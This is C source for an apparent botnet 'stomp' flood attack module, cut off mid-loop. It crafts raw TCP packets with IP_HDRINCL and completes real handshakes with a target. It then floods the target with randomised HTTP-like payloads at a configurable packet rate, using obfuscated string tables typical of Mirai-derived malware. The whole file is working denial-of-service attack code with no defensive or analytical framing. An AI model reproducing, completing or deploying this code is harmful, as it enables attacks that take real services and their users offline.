#include "../../attack.h"
#include "../../../../utils/headers/rand.h"
#include "../../../../utils/headers/checksum.h"
#include "../../../../utils/headers/util.h"


int sys_clock_gettime(int clk_id, struct timespec *tp);
#define CLOCK_MONOTONIC 1
typedef int int32_t;

#include "../../../../encryption/chacha20_table.h"

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
#define TCP_SYN 0x02
#define TCP_ACK 0x10
#define TCP_PSH 0x08
#define TCP_FIN 0x01
#define TCP_RST 0x04
#define TCP_URG 0x20
#define TCP_ECE 0x40
#define TCP_CWR 0x80
#define TCP_SYN_ACK (TCP_SYN | TCP_ACK)
#define TCP_FIN_ACK (TCP_FIN | TCP_ACK)

int PAYLENG;
int ppsent = 0;
unsigned long totalppsent = 0;
unsigned long rsthreshold = 200000;
unsigned int checkival = 10000;
unsigned int ppslast = 0;

static unsigned int floodPort;
volatile uint16_t ip_id_counter;
volatile int limiter;
volatile unsigned int pps = 0;
volatile unsigned int sleeptime = 0;
char recvbuffer[1400];

static volatile unsigned int targetpps;
static volatile int running = 1;

struct tcp_option
{
  uint8_t kind;
  uint8_t length;
  uint8_t data[10];
};

typedef struct
{
  uint32_t local_seq;
  uint32_t remote_seq;
  uint16_t local_port;
  uint16_t remote_port;
  uint32_t isn;
  int established;
  int closing;
  int fin_sent;
  int fin_received;
  int fin_ack_received;
  struct timeval start_time;
  uint32_t peer_tsval;
  unsigned long ppsent_in_session;
  unsigned int ppsack;
  uint32_t highack;
  int dupack;
  uint16_t peer_mss;
  uint8_t peer_wscale;
  uint32_t peer_win;
  uint32_t snd_una;
  uint32_t snd_nxt;
  uint32_t rcv_nxt;
  int established_final;
  uint32_t cwnd;
  uint32_t ssthresh;
  struct timeval last_send_time;
  int rto_ms;
  char rto_buf[1500];
  int rto_buf_len;
  uint32_t rto_seq;
  int rto_pending;
  uint32_t sack_left[4];
  uint32_t sack_right[4];
  int sack_blks;
  int zwp_active;
  struct timeval zwp_time;
  int zwp_rto_ms;
} tcpconnstate;

typedef struct
{
  char target_ip[64];
  uint16_t pshtimes;
  uint16_t baseport;
  int finignore;
  struct flood *flood;
} thread_data_t;

struct pseudo_header
{
  uint32_t source_address;
  uint32_t dest_address;
  uint8_t placeholder;
  uint8_t protocol;
  uint16_t tcp_length;
};

static inline uint32_t tcptimestamp(void)
{
  struct timespec ts;
  sys_clock_gettime(CLOCK_MONOTONIC, &ts);
  return (uint32_t)(ts.tv_sec * 1000 + ts.tv_nsec / 1000000);
}

static void stomp_randstr(char *s, const int len)
{
  char *charset = enc[RAND_ALPHANUM_STR].string;
  int i;
  for (i = 0; i < len; i++)
  {
    int key = rand_next() % enc[RAND_ALPHANUM_STR].len;
    s[i] = charset[key];
  }
  s[len] = '\0';
}

static char pp[4096];

static inline void genpay(char *buffer, int length, const char *host, uint32_t *seed)
{
  const char *patterns[] = {
      enc[HTTP_PATTERN_1].string,
      enc[HTTP_PATTERN_2].string,
      enc[HTTP_PATTERN_3].string,
      enc[HTTP_PATTERN_4].string,
      enc[HTTP_PATTERN_5].string};

  *seed = *seed * 1664525 + 1013904223;
  int p_idx = (*seed >> 16) % 5;
  int paylen = sprintf(buffer, patterns[p_idx], host);

  if (paylen > 0 && paylen < length)
  {
    int remaining = length - paylen;
    *seed = *seed * 1664525 + 1013904223;
    uint32_t offset = (*seed >> 16) % (4096 - remaining);
    memcpy(buffer + paylen, pp + offset, remaining);
  }
}

unsigned short stomp_csum(unsigned short *ptr, int nbytes)
{
  register long sum;
  unsigned short oddbyte;
  register short answer;

  sum = 0;
  while (nbytes > 1)
  {
    sum += *ptr++;
    nbytes -= 2;
  }
  if (nbytes == 1)
  {
    oddbyte = 0;
    *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
    sum += oddbyte;
  }

  sum = (sum >> 16) + (sum & 0xffff);
  sum = sum + (sum >> 16);
  answer = (short)~sum;

  return (answer);
}

uint32_t stomp_get_local_ip(void)
{
  int fd;
  struct sockaddr_in addr;
  socklen_t addr_len = sizeof(addr);

  if ((fd = sys_socket(AF_INET, SOCK_DGRAM, 0)) == -1)
  {
    return INADDR_ANY;
  }

  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = inet_addr(enc[ADDR_8_8_8_8].string);
  addr.sin_port = htons(53);

  sys_connect(fd, (struct sockaddr *)&addr, sizeof(addr));
  sys_getsockname(fd, (struct sockaddr *)&addr, &addr_len);
  sys_close(fd);

  return addr.sin_addr.s_addr;
}

void stomp_setup_tcp_header(struct tcphdr *tcpHeader, uint16_t sport, uint16_t dport,
                            uint32_t seq, uint32_t ack_seq, uint8_t flags,
                            uint16_t window, struct tcp_option *options,
                            int opt_count)
{
  tcpHeader->source = htons(sport);
  tcpHeader->dest = htons(dport);
  tcpHeader->seq = htonl(seq);
  tcpHeader->ack_seq = htonl(ack_seq);
  tcpHeader->ack = (flags & TCP_ACK) ? 1 : 0;
  tcpHeader->psh = (flags & TCP_PSH) ? 1 : 0;
  tcpHeader->rst = (flags & TCP_RST) ? 1 : 0;
  tcpHeader->syn = (flags & TCP_SYN) ? 1 : 0;
  tcpHeader->fin = (flags & TCP_FIN) ? 1 : 0;
  tcpHeader->urg = (flags & TCP_URG) ? 1 : 0;
  if (flags & TCP_ECE)
    ((uint8_t *)tcpHeader)[13] |= 0x40;
  if (flags & TCP_CWR)
    ((uint8_t *)tcpHeader)[13] |= 0x80;
  tcpHeader->doff = 5;
  tcpHeader->window = htons(65535);
  tcpHeader->urg_ptr = (flags & TCP_URG) ? htons(0xFFFF) : 0;
  tcpHeader->check = 0;

  if (opt_count > 0)
  {
    uint8_t *ptr = (uint8_t *)(tcpHeader + 1);
    int total_opt_bytes = 0;

    int i;
    for (i = 0; i < opt_count; i++)
    {
      if (options[i].kind == 0 || options[i].kind == 1)
      {
        ptr[total_opt_bytes] = options[i].kind;
        total_opt_bytes += 1;
      }
      else
      {
        ptr[total_opt_bytes] = options[i].kind;
        ptr[total_opt_bytes + 1] = options[i].length;
        memcpy(ptr + total_opt_bytes + 2, options[i].data,
               options[i].length - 2);
        total_opt_bytes += options[i].length;
      }
    }
    int words = (total_opt_bytes + 3) / 4;
    int padded_length = words * 4;
    int padding_needed = padded_length - total_opt_bytes;
    int j;
    for (j = 0; j < padding_needed; j++)
    {
      ptr[total_opt_bytes + j] = 0x01;
    }
    tcpHeader->doff = 5 + words;
  }
}

int stomp_send_tcp(int s, uint32_t saddr, uint32_t daddr, uint16_t sport,
                   uint16_t dport, uint32_t seq, uint32_t ack_seq, uint8_t flags,
                   uint16_t window, struct tcp_option *options, int opt_count,
                   char *payload, int PAYLENG)
{
  char datagram[MAX_PACKET_SIZE];

  struct iphdr *ipHeader = (struct iphdr *)datagram;
  struct tcphdr *tcpHeader = (struct tcphdr *)(datagram + sizeof(struct iphdr));

  stomp_setup_tcp_header(tcpHeader, sport, dport, seq, ack_seq, flags, window,
                         options, opt_count);

  int tcp_hdr_full_len = tcpHeader->doff * 4;
  int total_tcp_len = tcp_hdr_full_len + PAYLENG;

  if (PAYLENG > 0 && payload != NULL)
  {
    memcpy((uint8_t *)tcpHeader + tcp_hdr_full_len, payload, PAYLENG);
  }

  ipHeader->version_ihl = (4 << 4) | 5;
  ipHeader->tos = 0;
  ipHeader->tot_len = htons(sizeof(struct iphdr) + total_tcp_len);
  ipHeader->id = htons(0);
  ipHeader->frag_off = htons(0x4000);
  ipHeader->ttl = 64;
  ipHeader->protocol = IPPROTO_TCP;
  ipHeader->check = 0;
  ipHeader->saddr = saddr;
  ipHeader->daddr = daddr;

  ipHeader->check = stomp_csum((unsigned short *)datagram, sizeof(struct iphdr));

  uint32_t psh_sum = 0;
  psh_sum += (saddr >> 16) & 0xFFFF;
  psh_sum += saddr & 0xFFFF;
  psh_sum += (daddr >> 16) & 0xFFFF;
  psh_sum += daddr & 0xFFFF;
  psh_sum += htons(IPPROTO_TCP);
  psh_sum += htons(total_tcp_len);

  unsigned short tcp_sum = stomp_csum((unsigned short *)tcpHeader, total_tcp_len);
  psh_sum += ~tcp_sum & 0xFFFF;
  psh_sum = (psh_sum >> 16) + (psh_sum & 0xFFFF);
  psh_sum += (psh_sum >> 16);
  tcpHeader->check = (short)~psh_sum;
  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_port = htons(dport);
  sin.sin_addr.s_addr = daddr;

  int sent = sys_sendto(s, datagram, ntohs(ipHeader->tot_len), 0,
                    (void *)&sin, sizeof(sin));

  return sent;
}

void tcpopt_syn(struct tcp_option *options, int *opt_count)
{
  int count = 0;

  options[count].kind = 2;
  options[count].length = 4;
  options[count].data[0] = 0x05;
  options[count].data[1] = 0xB4;
  count++;

  options[count].kind = 4;
  options[count].length = 2;
  count++;

  options[count].kind = 8;
  options[count].length = 10;
  uint32_t ts_val = tcptimestamp();
  options[count].data[0] = (ts_val >> 24) & 0xFF;
  options[count].data[1] = (ts_val >> 16) & 0xFF;
  options[count].data[2] = (ts_val >> 8) & 0xFF;
  options[count].data[3] = ts_val & 0xFF;
  memset(options[count].data + 4, 0, 4);
  count++;

  options[count].kind = 1;
  options[count].length = 1;
  count++;

  options[count].kind = 3;
  options[count].length = 3;
  options[count].data[0] = 7;
  count++;

  *opt_count = count;
}

void tcpopt_nonsyn(struct tcp_option *options, int *opt_count,
                   uint32_t peer_tsval)
{
  int count = 0;

  options[count].kind = 1;
  options[count].length = 1;
  count++;

  options[count].kind = 1;
  options[count].length = 1;
  count++;

  options[count].kind = 8;
  options[count].length = 10;
  uint32_t ts_val = tcptimestamp();
  options[count].data[0] = (ts_val >> 24) & 0xFF;
  options[count].data[1] = (ts_val >> 16) & 0xFF;
  options[count].data[2] = (ts_val >> 8) & 0xFF;
  options[count].data[3] = ts_val & 0xFF;

  options[count].data[4] = (peer_tsval >> 24) & 0xFF;
  options[count].data[5] = (peer_tsval >> 16) & 0xFF;
  options[count].data[6] = (peer_tsval >> 8) & 0xFF;
  options[count].data[7] = peer_tsval & 0xFF;
  count++;

  *opt_count = count;
}
static void parse_tcp_options(struct tcphdr *tcp, tcpconnstate *conn)
{
  int header_bytes = tcp->doff * 4;
  int opt_len = header_bytes - (int)sizeof(struct tcphdr);
  if (opt_len <= 0)
    return;

  unsigned char *opts = (unsigned char *)(tcp + 1);
  int i = 0;
  while (i < opt_len)
  {
    uint8_t kind = opts[i];
    if (kind == 0)
      break;
    if (kind == 1)
    {
      i++;
      continue;
    }

    if (i + 1 >= opt_len)
      break;
    uint8_t len = opts[i + 1];
    if (len < 2 || i + len > opt_len)
      break;

    if (kind == 8 && len == 10)
    {
      conn->peer_tsval = ((uint32_t)opts[i + 2] << 24) |
                         ((uint32_t)opts[i + 3] << 16) |
                         ((uint32_t)opts[i + 4] << 8) | (uint32_t)opts[i + 5];
    }
    else if (kind == 2 && len == 4)
    {
      conn->peer_mss = ntohs(*(uint16_t *)(opts + i + 2));
    }
    else if (kind == 3 && len == 3)
    {
      conn->peer_wscale = opts[i + 2];
    }

    i += len;
  }
}

static uint32_t pptsval(struct tcphdr *tcp)
{
  tcpconnstate dummy = {0};
  parse_tcp_options(tcp, &dummy);
  return dummy.peer_tsval;
}

int connmatch(struct iphdr *ip, struct tcphdr *tcp, tcpconnstate *conn,
              uint32_t local_ip, uint32_t target_addr)
{
  if (ip->saddr != target_addr || ip->daddr != local_ip)
  {
    return 0;
  }

  if (ntohs(tcp->source) != conn->remote_port ||
      ntohs(tcp->dest) != conn->local_port)
  {
    return 0;
  }

  return 1;
}

static void send_sack_ack(int s, tcpconnstate *conn, uint32_t local_ip,
                          uint32_t target_addr)
{
  struct tcp_option opts[12];
  int opt_count = 0;

  opts[opt_count].kind = 1;
  opts[opt_count].length = 1;
  opt_count++;
  opts[opt_count].kind = 1;
  opts[opt_count].length = 1;
  opt_count++;
  opts[opt_count].kind = 8;
  opts[opt_count].length = 10;
  uint32_t ts = tcptimestamp();
  opts[opt_count].data[0] = (ts >> 24) & 0xFF;
  opts[opt_count].data[1] = (ts >> 16) & 0xFF;
  opts[opt_count].data[2] = (ts >> 8) & 0xFF;
  opts[opt_count].data[3] = ts & 0xFF;
  opts[opt_count].data[4] = (conn->peer_tsval >> 24) & 0xFF;
  opts[opt_count].data[5] = (conn->peer_tsval >> 16) & 0xFF;
  opts[opt_count].data[6] = (conn->peer_tsval >> 8) & 0xFF;
  opts[opt_count].data[7] = conn->peer_tsval & 0xFF;
  opt_count++;

  if (conn->sack_blks > 0 && conn->sack_blks <= 3)
  {
    int blks = conn->sack_blks;
    opts[opt_count].kind = 5;
    opts[opt_count].length = 2 + blks * 8;
    int i;
    for (i = 0; i < blks && i < 3; i++)
    {
      uint32_t l = htonl(conn->sack_left[i]);
      uint32_t r = htonl(conn->sack_right[i]);
      memcpy(opts[opt_count].data + i * 8 + 0, &l, 4);
      memcpy(opts[opt_count].data + i * 8 + 4, &r, 4);
    }
    opt_count++;
  }

  stomp_send_tcp(s, local_ip, target_addr, conn->local_port, conn->remote_port,
                 conn->snd_nxt, conn->rcv_nxt, TCP_ACK, 65535, opts, opt_count, NULL,
                 0);
}

int pshresp(int s, tcpconnstate *conn, uint32_t local_ip, uint32_t target_addr,
            int finignore, struct flood *flood)
{
  char buffer[16384];
  struct sockaddr_in from;
  socklen_t from_len = sizeof(from);
  int got_data = 0;

  while (1)
  {
    int recv_len = sys_recvfrom(s, buffer, sizeof(buffer), MSG_DONTWAIT,
                            (struct sockaddr *)&from, &from_len);
    if (recv_len <= 0)
      break;

    struct iphdr *ip = (struct iphdr *)buffer;
    struct tcphdr *tcp = (struct tcphdr *)(buffer + ((ip->version_ihl & 0x0F) * 4));

    if (!connmatch(ip, tcp, conn, local_ip, target_addr))
      continue;

    parse_tcp_options(tcp, conn);

    uint16_t tot_len = ntohs(ip->tot_len);
    int header_len = ((ip->version_ihl & 0x0F) * 4) + (tcp->doff * 4);
    int tcp_paylen = tot_len - header_len;
    uint32_t seg_seq = ntohl(tcp->seq);
    uint32_t seg_ack = ntohl(tcp->ack_seq);

    if (tcp_paylen > 0)
    {
      uint32_t next_rcv = seg_seq + tcp_paylen;
      if (seg_seq == conn->rcv_nxt)
      {
        conn->rcv_nxt = next_rcv;
        conn->remote_seq = next_rcv;
        if (conn->sack_blks > 0 && next_rcv >= conn->sack_right[0])
          conn->sack_blks = 0;
      }
      else if ((int32_t)(seg_seq - conn->rcv_nxt) > 0)
      {
        if (conn->sack_blks < 3)
        {
          conn->sack_left[conn->sack_blks] = seg_seq;
          conn->sack_right[conn->sack_blks] = next_rcv;
          conn->sack_blks++;
        }
      }
      got_data = 1;
    }

    if (tcp->ack)
    {
      if ((int32_t)(seg_ack - conn->snd_una) > 0)
      {
        conn->snd_una = seg_ack;
        conn->local_seq = seg_ack;
        conn->highack = seg_ack;
        conn->dupack = 0;
      }
      else if (seg_ack == conn->snd_una)
      {
        conn->dupack++;
        if (conn->dupack >= 3)
        {
          conn->snd_nxt = seg_ack;
          conn->local_seq = seg_ack;
          conn->dupack = 0;
        }
      }
    }

    conn->peer_win = ntohs(tcp->window)
                     << (conn->peer_wscale ? conn->peer_wscale : 0);

    if (tcp->rst)
      return -1;

    if (tcp->fin)
    {
      if (tcp_paylen == 0)
        conn->rcv_nxt++;
      else
        conn->rcv_nxt++;
      conn->remote_seq = conn->rcv_nxt;

      if (finignore == 1)
        return 0;
      return 2;
    }

    if (got_data)
    {
      send_sack_ack(s, conn, local_ip, target_addr);
      got_data = 0;
    }

    return 1;
  }

  return 0;
}

void endhand(int s, tcpconnstate *conn, uint32_t local_ip,
             uint32_t target_addr, struct flood *flood)
{
  struct tcp_option opts[12];
  int opt_count;

  if (conn->fin_received && !conn->fin_sent)
  {
    tcpopt_nonsyn(opts, &opt_count, conn->peer_tsval);
    stomp_send_tcp(s, local_ip, target_addr, conn->local_port, conn->remote_port,
                   conn->snd_nxt, conn->rcv_nxt, TCP_ACK, 65535, opts, opt_count,
                   NULL, 0);

    tcpopt_nonsyn(opts, &opt_count, conn->peer_tsval);
    stomp_send_tcp(s, local_ip, target_addr, conn->local_port, conn->remote_port,
                   conn->snd_nxt, conn->rcv_nxt, TCP_FIN | TCP_ACK, 65535, opts,
                   opt_count, NULL, 0);
    conn->fin_sent = 1;
    uint32_t fin_seq = conn->snd_nxt;

    struct timeval t_start, t_now;
    sys_gettimeofday(&t_start, NULL);

    while (!conn->fin_ack_received && *flood->running)
    {
      sys_gettimeofday(&t_now, NULL);
      if (t_now.tv_sec - t_start.tv_sec > 2)
        break;

      char buf[16384];
      struct sockaddr_in from;
      socklen_t fl = sizeof(from);
      int rlen = sys_recvfrom(s, buf, sizeof(buf), MSG_DONTWAIT,
                          (struct sockaddr *)&from, &fl);
      if (rlen <= 0)
      {
        sys_usleep(100);
        continue;
      }

      struct iphdr *ip = (struct iphdr *)buf;
      struct tcphdr *tcp = (struct tcphdr *)(buf + ((ip->version_ihl & 0x0F) * 4));

      if (!connmatch(ip, tcp, conn, local_ip, target_addr))
        continue;

      parse_tcp_options(tcp, conn);

      if (tcp->ack)
      {
        uint32_t seg_ack = ntohl(tcp->ack_seq);
        if ((int32_t)(seg_ack - (fin_seq + 1)) >= 0)
        {
          conn->snd_una = seg_ack;
          conn->fin_ack_received = 1;
          break;
        }
      }
      if (tcp->rst)
        break;
    }
  }
}

int synhand(int s, tcpconnstate *conn, uint32_t local_ip,
            uint32_t target_addr, struct flood *flood)
{
  struct tcp_option syn_options[12];
  int syn_opt_count;

  tcpopt_syn(syn_options, &syn_opt_count);
  ssize_t sent =
      stomp_send_tcp(s, local_ip, target_addr, conn->local_port, conn->remote_port,
                     conn->local_seq, 0, TCP_SYN | TCP_ECE | TCP_CWR, 65535,
                     syn_options, syn_opt_count, NULL, 0);
  if (sent < 0)
    return 0;

  uint32_t expected_ack = conn->local_seq + 1;
  struct timeval start, now, last_syn;
  sys_gettimeofday(&start, NULL);
  sys_gettimeofday(&last_syn, NULL);
  int rto_ms = 100;

  while (*flood->running)
  {
    sys_gettimeofday(&now, NULL);
    if (now.tv_sec - start.tv_sec > 10)
      break;

    long elapsed_since_syn = (now.tv_sec - last_syn.tv_sec) * 1000 +
                             (now.tv_usec - last_syn.tv_usec) / 1000;
    if (elapsed_since_syn >= rto_ms)
    {
      tcpopt_syn(syn_options, &syn_opt_count);
      stomp_send_tcp(s, local_ip, target_addr, conn->local_port, conn->remote_port,
                     conn->local_seq, 0, TCP_SYN | TCP_ECE | TCP_CWR, 65535,
                     syn_options, syn_opt_count, NULL, 0);
      sys_gettimeofday(&last_syn, NULL);
      rto_ms = rto_ms * 2 > 64000 ? 64000 : rto_ms * 2;
    }

    char buffer[16384];
    struct sockaddr_in from;
    socklen_t from_len = sizeof(from);
    int recv_len = sys_recvfrom(s, buffer, sizeof(buffer), MSG_DONTWAIT,
                            (struct sockaddr *)&from, &from_len);
    if (recv_len <= 0)
    {
      sys_usleep(500);
      continue;
    }

    struct iphdr *ip = (struct iphdr *)buffer;
    struct tcphdr *tcp = (struct tcphdr *)(buffer + ((ip->version_ihl & 0x0F) * 4));

    if (!connmatch(ip, tcp, conn, local_ip, target_addr))
      continue;

    if (tcp->rst)
    {
      uint32_t rstack = ntohl(tcp->ack_seq);
      if (tcp->ack && (int32_t)(rstack - (conn->local_seq + 1)) == 0)
      {
        conn->established = 0;
        conn->closing = 1;
        return 0;
      }
      continue;
    }

    if (tcp->syn && tcp->ack)
    {
      uint32_t recv_seq = ntohl(tcp->seq);
      uint32_t recv_ack = ntohl(tcp->ack_seq);

      if (recv_ack != expected_ack)
        continue;

      parse_tcp_options(tcp, conn);

      conn->established = 1;
      conn->rcv_nxt = recv_seq + 1;
      conn->remote_seq = recv_seq + 1;
      conn->snd_una = recv_ack;
      conn->snd_nxt = recv_ack;
      conn->local_seq = recv_ack;
      conn->peer_win = ntohs(tcp->window)
                       << (conn->peer_wscale ? conn->peer_wscale : 0);
      conn->cwnd = 10;
      conn->ssthresh = 0x7fffffff;

      struct tcp_option ack_opts[12];
      int ack_opt_count;
      tcpopt_nonsyn(ack_opts, &ack_opt_count, conn->peer_tsval);
      stomp_send_tcp(s, local_ip, target_addr, conn->local_port, conn->remote_port,
                     conn->snd_nxt, conn->rcv_nxt, TCP_ACK, 65535, ack_opts,
                     ack_opt_count, NULL, 0);

      return 1;
    }
  }
  return 0;
}

void finrx(int s, tcpconnstate *conn, uint32_t local_ip, uint32_t target_addr,
           int finignore, struct flood *flood)
{
  while (1)
  {
    char buffer[65536];
    struct sockaddr_in from;
    socklen_t from_len = sizeof(from);

    int recv_len = sys_recvfrom(s, buffer, sizeof(buffer), MSG_DONTWAIT,
                            (struct sockaddr *)&from, &from_len);
    if (recv_len <= 0)
      break;

    struct iphdr *ip = (struct iphdr *)buffer;
    struct tcphdr *tcp = (struct tcphdr *)(buffer + ((ip->version_ihl & 0x0F) * 4));

    if (!connmatch(ip, tcp, conn, local_ip, target_addr))
      continue;

    parse_tcp_options(tcp, conn);

    uint16_t tot_len = ntohs(ip->tot_len);
    int hdr_len = ((ip->version_ihl & 0x0F) * 4) + (tcp->doff * 4);
    int tcp_paylen = tot_len - hdr_len;
    uint32_t seg_seq = ntohl(tcp->seq);
    uint32_t seg_ack = ntohl(tcp->ack_seq);

    if (tcp_paylen > 0)
    {
      uint32_t next = seg_seq + tcp_paylen;
      if ((int32_t)(next - conn->rcv_nxt) > 0)
      {
        conn->rcv_nxt = next;
        conn->remote_seq = next;
      }
    }

    if (tcp->ack && (int32_t)(seg_ack - conn->snd_una) > 0)
    {
      conn->snd_una = seg_ack;
      conn->local_seq = seg_ack;
      conn->highack = seg_ack;
      conn->dupack = 0;
    }
    else if (tcp->ack && seg_ack == conn->snd_una)
    {
      conn->dupack++;
    }

    if (tcp->rst)
    {
      conn->established = 0;
      conn->closing = 1;
      break;
    }
    else if (tcp->fin)
    {
      uint32_t fin_rcv_nxt = seg_seq + tcp_paylen + 1;
      if ((int32_t)(fin_rcv_nxt - conn->rcv_nxt) > 0)
      {
        conn->rcv_nxt = fin_rcv_nxt;
        conn->remote_seq = fin_rcv_nxt;
      }

      if (finignore == 0)
      {
        conn->fin_received = 1;
        endhand(s, conn, local_ip, target_addr, flood);
        conn->established = 0;
        conn->closing = 1;
        break;
      }
      else
      {
        send_sack_ack(s, conn, local_ip, target_addr);
      }
    }
  }
}

void *stomp_flood_thread(void *arg)
{
  thread_data_t *data = (thread_data_t *)arg;
  char *target_ip = data->target_ip;
  uint16_t pshtimes = data->pshtimes;
  uint16_t baseport = data->baseport;
  int finignore = data->finignore;
  struct flood *flood = data->flood;

  uint32_t local_ip = stomp_get_local_ip();
  uint32_t target_addr = inet_addr(target_ip);

  int s = sys_socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  if (s < 0)
  {
    debug("socket failed\n");
    return NULL;
  }

  int tmp = 1;
  if (sys_setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0)
  {
    debug("sys_setsockopt failed\n");
    sys_close(s);
    return NULL;
  }

  int icmp_s = sys_socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
  struct timeval icmp_tv = {0, 1000};
  if (icmp_s >= 0)
    sys_setsockopt(icmp_s, SOL_SOCKET, SO_RCVTIMEO, &icmp_tv, sizeof(icmp_tv));

  struct timeval tv_timeout = {0, 5000};
  sys_setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv_timeout, sizeof(tv_timeout));


  uint32_t lseed = sys_time(NULL) ^ sys_getpid();
  while (*flood->running)
  {
    lseed = lseed * 1664525 + 1013904223;
    uint16_t sport = baseport + ((lseed >> 16) % 8192);
    if (sport < 32768)
    {
      lseed = lseed * 1664525 + 1013904223;
      sport = 32768 + ((lseed >> 16) % 28231);
    }
    if (sport > 60999)
    {
      lseed = lseed * 1664525 + 1013904223;
      sport = 32768 + ((lseed >> 16) % 28231);
    }

    lseed = lseed * 1664525 + 1013904223;
    uint32_t isn = lseed ^ (lseed << 16);

    tcpconnstate conn = {.local_seq = isn,
                         .remote_seq = 0,
                         .local_port = sport,
                         .remote_port = floodPort,
                         .isn = isn,
                         .established = 0,
                         .closing = 0,
                         .fin_sent = 0,
                         .fin_received = 0,
                         .fin_ack_received = 0,
                         .peer_tsval = 0,
                         .ppsent_in_session = 0,
                         .ppsack = 0,
                         .highack = 0,
                         .dupack = 0,
                         .rto_ms = 100,
                         .rto_pending = 0,
                         .rto_buf_len = 0,
                         .sack_blks = 0,
                         .zwp_active = 0,
                         .zwp_rto_ms = 100};
    sys_gettimeofday(&conn.start_time, NULL);
    sleeptime = flood->settings->sleep;
    sys_gettimeofday(&conn.last_send_time, NULL);
    sys_gettimeofday(&conn.zwp_time, NULL);

    struct pps_limiter pps_limit;
    pps_limit_init(&pps_limit, flood->settings->min_pps, flood->settings->max_pps);

    if (!synhand(s, &conn, local_ip, target_addr, flood))
    {
      sys_usleep(500);
      continue;
    }
    conn.established_final = 1;

    unsigned int i_limiter = 0;
    while (conn.established && !conn.closing && *flood->running)
    {
      if (conn.ppsent_in_session >= rsthreshold)
      {
        if (finignore == 0)
        {
          conn.fin_sent = 1;
          conn.closing = 1;

          struct tcp_option fin_options[12];
          int fin_opt_count;
          tcpopt_nonsyn(fin_options, &fin_opt_count, conn.peer_tsval);

          stomp_send_tcp(s, local_ip, target_addr, conn.local_port, conn.remote_port,
                         conn.local_seq, conn.remote_seq, TCP_FIN | TCP_ACK, 64240,
                         fin_options, fin_opt_count, NULL, 0);

          struct timeval fin_start, fin_now;
          sys_gettimeofday(&fin_start, NULL);
          int ack_received = 0;

          while (!ack_received && *flood->running)
          {
            sys_gettimeofday(&fin_now, NULL);
            if (fin_now.tv_sec - fin_start.tv_sec > 2)
            {
              break;
            }

            char buffer[65536];
            struct sockaddr_in from;
            socklen_t from_len = sizeof(from);

            int recv_len = sys_recvfrom(s, buffer, sizeof(buffer), MSG_DONTWAIT,
                                    (struct sockaddr *)&from, &from_len);

            if (recv_len > 0)
            {
              struct iphdr *ip = (struct iphdr *)buffer;
              struct tcphdr *tcp = (struct tcphdr *)(buffer + ((ip->version_ihl & 0x0F) * 4));

              if (connmatch(ip, tcp, &conn, local_ip, target_addr))
              {
                uint32_t latest_tsval = pptsval(tcp);
                if (latest_tsval > 0)
                {
                  conn.peer_tsval = latest_tsval;
                }

                if (tcp->ack || tcp->psh)
                {
                  uint16_t tot_len = ntohs(ip->tot_len);
                  int header_len = ((ip->version_ihl & 0x0F) * 4) + (tcp->doff * 4);
                  int tcp_paylen = tot_len - header_len;
                  uint32_t expected_remote_seq = ntohl(tcp->seq) + tcp_paylen;

                  if (tcp_paylen > 0 &&
                      (int32_t)(expected_remote_seq - conn.remote_seq) > 0)
                  {
                    conn.remote_seq = expected_remote_seq;
                  }
                }

                if (tcp->fin && tcp->ack) // fin received
                {
                  conn.fin_received = 1;
                  tcpopt_nonsyn(fin_options, &fin_opt_count, conn.peer_tsval);
                  stomp_send_tcp(s, local_ip, target_addr, conn.local_port,
                                 conn.remote_port, conn.local_seq + 1,
                                 conn.remote_seq + 1, TCP_ACK, 64240, fin_options,
                                 fin_opt_count, NULL, 0);
                  conn.established = 0;
                  break;
                }
                else if (tcp->ack &&
                         ntohl(tcp->ack_seq) == conn.local_seq + 1) //received ack
                {
                  ack_received = 1;
                  conn.local_seq++;

                  sys_gettimeofday(&fin_start, NULL);
                  while (!conn.fin_received && *flood->running)
                  {
                    sys_gettimeofday(&fin_now, NULL);
                    if (fin_now.tv_sec - fin_start.tv_sec > 2)
                    {
                      break;
                    }

                    recv_len = sys_recvfrom(s, buffer, sizeof(buffer), MSG_DONTWAIT,
                                        (struct sockaddr *)&from, &from_len);

                    if (recv_len > 0)
                    {
                      ip = (struct iphdr *)buffer;
                      tcp = (struct tcphdr *)(buffer + ((ip->version_ihl & 0x0F) * 4));

                      if (connmatch(ip, tcp, &conn, local_ip, target_addr))
                      {
                        uint32_t latest_tsval = pptsval(tcp);
                        if (latest_tsval > 0)
                        {
                          conn.peer_tsval = latest_tsval;
                        }

                        if (tcp->ack || tcp->psh)
                        {
                          uint16_t tot_len = ntohs(ip->tot_len);
                          int header_len = ((ip->version_ihl & 0x0F) * 4) + (tcp->doff * 4);
                          int tcp_paylen = tot_len - header_len;
                          uint32_t expected_remote_seq =
                              ntohl(tcp->seq) + tcp_paylen;

                          if (tcp_paylen > 0 &&
                              (int32_t)(expected_remote_seq - conn.remote_seq) >
                                  0)
                          {
                            conn.remote_seq = expected_remote_seq;
                          }
                        }

                        if (tcp->fin || (tcp->fin && tcp->ack))
                        {
                          conn.fin_received = 1;
                          tcpopt_nonsyn(fin_options, &fin_opt_count,
                                        conn.peer_tsval);
                          stomp_send_tcp(s, local_ip, target_addr, conn.local_port,
                                         conn.remote_port, conn.local_seq,
                                         conn.remote_seq + 1, TCP_ACK, 64240,
                                         fin_options, fin_opt_count, NULL, 0);
                          conn.remote_seq++;
                          conn.established = 0;
                          break;
                        }
                      }
                    }
                  }
                  break;
                }
                else if (tcp->rst) //reset
                {
                  conn.established = 0;
                  break;
                }
              }
            }
          }
        }
        else
        {
          conn.established = 0;
          conn.closing = 1;
        }
        break;
      }

      lseed = lseed * 1664525 + 1013904223;
      int current_payleng = 1300 + ((lseed >> 16) % 100);
      char payload[current_payleng];
      genpay(payload, current_payleng, target_ip, &lseed);

      ssize_t sent_bytes;

      struct tcp_option data_options[12];
      int data_opt_count;
      tcpopt_nonsyn(data_options, &data_opt_count, conn.peer_tsval);

      sent_bytes =
          stomp_send_tcp(s, local_ip, target_addr, conn.local_port, conn.remote_port,
                         conn.snd_nxt, conn.rcv_nxt, TCP_PSH | TCP_ACK, 64240,
                         data_options, data_opt_count, payload, current_payleng);
      if (sent_bytes > 0)
      {
        ppsent++;
